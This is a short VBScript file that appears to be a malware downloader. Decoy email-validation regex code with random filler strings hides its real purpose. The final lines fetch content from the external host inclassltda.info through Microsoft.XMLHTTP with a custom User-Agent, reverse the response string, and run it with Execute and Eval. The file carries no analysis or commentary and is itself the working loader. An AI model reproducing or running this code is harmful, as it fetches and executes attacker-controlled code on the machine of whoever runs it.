Oi74XKE = "3E8IU3K4wku0jb2X4jVtvp0sr" & "@" & "3E8IU3K4wku0jb2X4jVtvp0sr" & "." & "3E8IU3K4wku0jb2X4jVtvp0sr"

Set Oi74XXY = New RegExp

With Oi74XXY
    .Pattern    = "ˆ([\w-]+\.)*[\w-]+@([\w-]+\.)+[a-z]{2,4}$"
    .IgnoreCase = True
    .Global     = False
End With


Oi74XXY.Pattern = "ˆ([\w-]+\.)*[\w-]+@([\w-]+)(\.[\w-]+)*\.[a-z]{2,4}$"

Set objMatch = Oi74XXY.Execute( Oi74XKE )

Set objMatch = Nothing

Oi74XXY.Pattern = "@" & Oi74XGH
Oi74XWT  = "3E8IU3K4wku0jb2X4jVtvp0sr"

Oi74XCF = Oi74XXY.Replace( Oi74XKE, "@" & Oi74XWT )

Set Oi74XXY = Nothing

XmulT="3E8IU3K4wku0jb2X4jVtvp0sr"
URL="http://inclassltda.info/?tgow=cc2&" & XmulT
set Oi74X=CreateObject("Microsoft.XMLHTTP")

Oi74X.open "GET",URL,false
Oi74X.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
Oi74X.setRequestHeader "User-Agent", "COOLDOWN"
Oi74X.send "Z"

dim PKgYl

function PKgYlTT()
For i = Len(Oi74X.responsetext) to 1  Step-1
var= Mid(Oi74X.responsetext,  i  , 1)
PKgYl = PKgYl & var
Next
end function 

execute " Eval(""PKgYlTT()"") : Execute PKgYl & XmulTOi74X "
